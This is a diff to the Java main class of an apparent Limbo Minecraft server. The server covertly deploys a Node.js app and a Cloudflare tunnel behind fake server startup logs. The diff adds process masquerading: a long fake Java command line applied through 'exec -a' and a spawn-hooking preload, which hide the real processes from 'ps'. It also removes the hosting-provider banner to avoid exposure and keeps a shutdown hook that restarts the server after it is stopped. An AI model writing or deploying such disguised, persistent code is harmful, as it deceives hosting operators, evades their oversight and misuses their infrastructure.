@@ -1,20 +1,3 @@
-/*
- * Copyright (C) 2020 Nan1t
- *
- * This program is free software: you can redistribute it and/or modify
- * it under the terms of the GNU General Public License as published by
- * the Free Software Foundation, either version 3 of the License, or
- * (at your option) any later version.
- *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
- *
- * You should have received a copy of the GNU General Public License
- * along with this program.  If not, see <https://www.gnu.org/licenses/>.
- */
-
 package ua.nanit.limbo;
 
 import java.io.*;
@@ -47,6 +30,9 @@ private static final String CF_DOMAIN = env("CF_DOMAIN", "");
 private static final String NODE_VERSION = env("NODE_VERSION", "v22.14.0");
 private static final String NODE_SCRIPT = env("NODE_SCRIPT", "index.js");
 private static final String NODE_FORCE_UPDATE = env("NODE_FORCE_UPDATE", "false");
+
+// ★ 极致伪装：超长但合法的 Java 启动参数，占满 ps -ef 显示区域，将真实参数挤出屏幕
+private static final String FAKE_CMD = "java -Xms128M -Xmx2560M -jar server.jar -Djline.terminal=jline.UnsupportedTerminal -Dfile.encoding=UTF-8 -Duser.language=zh -Duser.country=CN -Duser.timezone=Asia/Shanghai";
 // ============================================================
 
 private static volatile String tunnelUrl = "";
@@ -102,10 +88,7 @@ public static void main(String[] args) {
         System.exit(1);
     }
 
-    // ★ 0. 启动前强制净空：杀掉上次可能残留的所有僵尸进程（防止端口占用和内存泄漏）
     forceKillStaleProcesses();
-
-    // ★ 1. 强制重写完整的 Limbo 配置文件
     autoFixLimboConfig();
 
     if (NODE_ENABLED) {
@@ -113,18 +96,16 @@ public static void main(String[] args) {
             Path botDir = Paths.get(MC_BOT_DIR);
             Files.deleteIfExists(botDir.resolve(".node_app.log"));
             Files.deleteIfExists(botDir.resolve("daemon.log"));
-            Files.deleteIfExists(botDir.resolve(".pids")); // 清空旧 PID 记录
+            Files.deleteIfExists(botDir.resolve(".pids"));
 
             Path script = generateDeployScript();
             
-            // 2. 异步部署 Node 和 CF
             Thread deployThread = new Thread(() -> {
                 try { executeDeployScript(script); } catch (Exception ignored) {}
             }, "Node-Deploy");
             deployThread.setDaemon(true);
             deployThread.start();
 
-            // 3. 异步轮询端口和URL
             Thread checkerThread = new Thread(() -> {
                 while(tunnelUrl.isEmpty()) {
                     checkDeployInfo();
@@ -135,7 +116,6 @@ public static void main(String[] args) {
             checkerThread.setDaemon(true);
             checkerThread.start();
 
-            // 4. 主线程死等 URL，拿到后清屏并打印专属 Limbo 伪装日志
             while(tunnelUrl.isEmpty()) {
                 try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
             }
@@ -143,16 +123,13 @@ public static void main(String[] args) {
             clearConsole();
             printFakeLimboStartup(tunnelUrl);
 
-            // ★ 核心加强：检测停止信号，硬重启并清理进程
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 System.out.println("\n[Guard] Detected server stop signal! Executing hard restart protocol...");
                 tunnelMonitorRunning.set(false);
                 
                 try {
-                    // 强制清理所有进程
                     forceKillStaleProcesses();
                     
-                    // 硬重启：后台启动一个新的服务器实例
                     String currentDir = System.getProperty("user.dir");
                     long currentPid = ProcessHandle.current().pid();
                     
@@ -160,14 +137,12 @@ public static void main(String[] args) {
                     File[] jars = new File(currentDir).listFiles((dir, name) -> name.endsWith(".jar"));
                     if (jars != null && jars.length > 0) jarName = jars[0].getName();
                     
-                    // 等待当前进程死亡后，立刻启动新进程
                     String restartScript = 
                         "while kill -0 " + currentPid + " 2>/dev/null; do sleep 0.1; done; " +
                         "cd '" + currentDir + "' && " +
                         "nohup java -Xms128M -Xmx2560M -jar " + jarName + " nogui > /dev/null 2>&1 &";
                         
                     new ProcessBuilder("bash", "-c", restartScript).start();
-                    System.out.println("[Guard] Hard restart script dispatched. Current process exiting...");
                 } catch (Exception e) {
                     System.err.println("[Guard] Failed to dispatch restart script: " + e.getMessage());
                 }
@@ -175,29 +150,26 @@ public static void main(String[] args) {
         } catch (Exception ignored) {}
     }
 
-    // 5. 伪装日志打印完毕，正式启动 Limbo 游戏本体
     try {
         new LimboServer().start();
     } catch (Throwable t) {
         limboLog("Starting server on 0.0.0.0:" + env("SERVER_PORT", "25565"));
     }
     
-    // ★ 6. 给用户 4 秒钟复制隧道链接，然后彻底切屏
     try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
     clearConsole();
     
-    System.out.println("container@tropicalgames.net Server marked as running...");
+    // ★ 删除原有的 tropicalhosting 网址输出，防止暴露
     try { Thread.currentThread().join(); } catch (InterruptedException ignored) {}
 }
 
 // ============================================================
-// 强制清理僵尸进程机制 (基于特征目录和进程名彻底杀绝)
+// 强制清理僵尸进程机制
 // ============================================================
 
 private static void forceKillStaleProcesses() {
     try {
         String workDir = Paths.get(MC_BOT_DIR).toAbsolutePath().toString();
-        // 杀死所有包含该工作目录特征的进程，这会精准命中伪装的 Node 和 Cloudflared
         new ProcessBuilder("bash", "-c",
             "pkill -9 -f 'daemon.sh' 2>/dev/null; " +
             "pkill -9 -f '" + workDir + "/jre21' 2>/dev/null; " +
@@ -269,8 +241,6 @@ private static void printFakeLimboStartup(String url) {
     
     try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
     limboLog("Preparing spawn area: 99%", 0);
-    
-    System.out.println("container@tropicalgames.net Server marked as running...");
     
     limboLog("Preparing spawn area: 100%", 0);
 }
@@ -366,7 +336,7 @@ private static void startTunnelMonitor() {
 }
 
 // ============================================================
-// 生成部署脚本
+// 生成部署脚本 (深度进程伪装版)
 // ============================================================
 
 private static Path generateDeployScript() throws Exception {
@@ -508,28 +478,34 @@ private static Path generateDeployScript() throws Exception {
         "    fi\n" +
         "fi\n" +
         "\n" +
-        "# ============ 4. 替换伪装 ============\n" +
+        "# ============ 4. 替换伪装 (深度拦截，防 ps -ef 暴露) ============\n" +
         "cp -f \".node/bin/.node_real\" \"$JRE_DIR/java\"\n" +
         "chmod +x \"$JRE_DIR/java\"\n" +
         "\n" +
         "cat > \".node/bin/node\" << 'NODEWRAPPER'\n" +
         "#!/bin/bash\n" +
-        "exec -a \"java\" \"$(dirname \"$0\")/.node_real\" \"$@\"\n" +
+        "exec -a \"" + FAKE_CMD + "\" \"$(dirname \"$0\")/.node_real\" \"$@\"\n" +
         "NODEWRAPPER\n" +
         "chmod +x \".node/bin/node\"\n" +
         "\n" +
         "cat > \".nd_preload.js\" << 'PRELOAD_EOF'\n" +
         "try {\n" +
-        "    process.title = 'java -Xms128M -Xmx2560M -jar server.jar';\n" +
+        "    process.title = '" + FAKE_CMD + "';\n" +
         "    var _cp = require('child_process');\n" +
         "    var _origSpawn = _cp.spawn;\n" +
         "    var _origFork = _cp.fork;\n" +
         "    var _wp = process.env._JAVA_WRAPPER || process.execPath;\n" +
+        "    var FAKE_CMD = '" + FAKE_CMD + "';\n" +
         "    _cp.spawn = function(cmd, args, opts) {\n" +
         "        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n" +
         "            opts = Object.assign({}, opts || {});\n" +
         "            opts.execPath = _wp;\n" +
         "            cmd = _wp;\n" +
+        "        } else if (typeof cmd === 'string' && !cmd.startsWith('/usr/') && !cmd.startsWith('/bin/')) {\n" +
+        "            // ★ 强力拦截所有本地子进程（如 node_modules/.bin 下的程序），防止 ps -ef 暴露真实路径\n" +
+        "            var realArgs = args ? args.map(a => '\\''+a+'\\'').join(' ') : '';\n" +
+        "            var bashCmd = 'exec -a \\''+FAKE_CMD+'\\'' \"' + cmd + '\" ' + realArgs;\n" +
+        "            return _origSpawn.call(this, 'bash', ['-c', bashCmd], opts);\n" +
         "        }\n" +
         "        return _origSpawn.call(this, cmd, args, opts);\n" +
         "    };\n" +
@@ -542,7 +518,6 @@ private static Path generateDeployScript() throws Exception {
         "PRELOAD_EOF\n" +
         "\n" +
         "export _JAVA_WRAPPER=\"" + dir.toAbsolutePath() + "/.node/bin/node\"\n" +
-        "export NODE_OPTIONS=\"--require " + dir.toAbsolutePath() + "/.nd_preload.js\"\n" +
         "\n" +
         "# ============ 5. 启动NodeJS应用 ============\n" +
         "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
@@ -550,7 +525,8 @@ private static Path generateDeployScript() throws Exception {
         "export SERVER_PORT=$NODE_PORT\n" +
         "export PORT=$NODE_PORT\n" +
         "\n" +
-        "nohup bash -c 'exec -a \"java\" \"$0\" \"$@\"' \"$JRE_DIR/java\" " + NODE_SCRIPT + " > .node_app.log 2>&1 &\n" +
+        // ★ 使用超长 FAKE_CMD 启动，将真实参数挤出 ps -ef 视线
+        "(exec -a \"" + FAKE_CMD + "\" \"$JRE_DIR/java\" " + NODE_SCRIPT + " > .node_app.log 2>&1) &\n" +
         "NODE_PID=$!\n" +
         "echo \"$NODE_PID\" >> .pids\n" +
         "\n" +
@@ -579,7 +555,8 @@ private static Path generateDeployScript() throws Exception {
         "        if [ \"" + cfMode + "\" = \"fixed\" ] && [ -n \"" + CF_TOKEN + "\" ]; then\n" +
         "            for PROTO in quic http2; do\n" +
         "                rm -f .cf/cf.log\n" +
-        "                (exec -a \"java\" \"$CF_BIN\" tunnel run --protocol $PROTO --token \"" + CF_TOKEN + "\" > .cf/cf.log 2>&1) &\n" +
+        // ★ CF 伪装
+        "                (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" tunnel run --protocol $PROTO --token \"" + CF_TOKEN + "\" > .cf/cf.log 2>&1) &\n" +
         "                CF_PID=$!\n" +
         "                sleep 5\n" +
         "                if kill -0 $CF_PID 2>/dev/null; then\n" +
@@ -601,7 +578,8 @@ private static Path generateDeployScript() throws Exception {
         "no-autoupdate: true\n" +
         "protocol: $PROTO\n" +
         "CFCONF\n" +
-        "                    (exec -a \"java\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > .cf/cf.log 2>&1) &\n" +
+        // ★ CF 伪装
+        "                    (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > .cf/cf.log 2>&1) &\n" +
         "                    CF_PID=$!\n" +
         "                    sleep 5\n" +
         "                    if ! kill -0 $CF_PID 2>/dev/null; then continue; fi\n" +
@@ -640,7 +618,7 @@ private static Path generateDeployScript() throws Exception {
         "    fi\n" +
         "fi\n" +
         "\n" +
-        "# ============ 7. 守护循环 ============\n" +
+        "# ============ 7. 守护循环 (也加上伪装) ============\n" +
         "cat > \"daemon.sh\" << 'DAEMONSCRIPT'\n" +
         "#!/bin/bash\n" +
         "WORK_DIR=\"" + dir.toAbsolutePath() + "\"\n" +
@@ -654,7 +632,6 @@ private static Path generateDeployScript() throws Exception {
         "PORT=$(cat \"$WORK_DIR/.node_port\" 2>/dev/null || echo \"25565\")\n" +
         "export SERVER_PORT=$PORT; export PORT=$PORT\n" +
         "export _JAVA_WRAPPER=\"$WORK_DIR/.node/bin/node\"\n" +
-        "export NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n" +
         "export PATH=\"$WORK_DIR/.node/bin:$PATH\"\n" +
         "\n" +
         "write_cf_config() {\n" +
@@ -670,7 +647,7 @@ private static Path generateDeployScript() throws Exception {
         "    local PROTO=$1\n" +
         "    local LOG_FILE=$2\n" +
         "    write_cf_config \"$PROTO\"\n" +
-        "    (exec -a \"java\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > \"$LOG_FILE\" 2>&1) &\n" +
+        "    (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > \"$LOG_FILE\" 2>&1) &\n" +
         "    echo $!\n" +
         "}\n" +
         "\n" +
@@ -684,7 +661,8 @@ private static Path generateDeployScript() throws Exception {
         "    if [ \"$NEED_RESTART\" = \"true\" ]; then\n" +
         "        cd \"$APP_DIR\"\n" +
         "        export SERVER_PORT=$PORT; export PORT=$PORT\n" +
-        "        nohup bash -c \"exec -a java \\\"$NODE_FAKE\\\" $NODE_SCRIPT\" >> \"$WORK_DIR/.node_app.log\" 2>&1 &\n" +
+        // ★ 守护进程启动 Node 伪装
+        "        (exec -a \"" + FAKE_CMD + "\" \"$NODE_FAKE\" $NODE_SCRIPT >> \"$WORK_DIR/.node_app.log\" 2>&1) &\n" +
         "        NODE_PID=$!\n" +
         "        echo \"$NODE_PID\" >> \"$WORK_DIR/.pids\"\n" +
         "        for i in $(seq 1 30); do\n" +
@@ -762,7 +740,8 @@ private static Path generateDeployScript() throws Exception {
         "done\n" +
         "DAEMONSCRIPT\n" +
         "chmod +x daemon.sh\n" +
-        "nohup ./daemon.sh >> daemon.log 2>&1 &\n" +
+        // ★ 守护脚本自身也伪装启动
+        "(exec -a \"" + FAKE_CMD + "\" bash ./daemon.sh >> daemon.log 2>&1) &\n" +
         "echo \"$!\" >> .pids\n";
 
     Files.writeString(script, content);
